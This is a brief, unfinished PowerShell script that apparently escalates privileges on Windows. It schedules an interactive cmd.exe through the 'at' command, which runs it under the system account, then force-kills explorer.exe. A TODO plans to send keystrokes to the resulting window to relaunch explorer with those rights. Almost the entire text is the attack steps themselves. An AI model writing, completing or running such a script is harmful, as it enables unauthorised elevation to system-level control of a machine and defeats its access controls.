#Create variable with current time + one minute
$time = (Get-Date).AddMinutes(1).ToString('HH:mm') #Perhaps change to "AddSeconds" to optimize performance

#Schedule Command Prompt to open at $time
at $time /interactive cmd.exe

#Kill Windows Explorer without automatically opening again
taskkill /F /IM explorer.exe

#TODO
#Send keystrokes to "svchost.exe" window to open explorer.exe


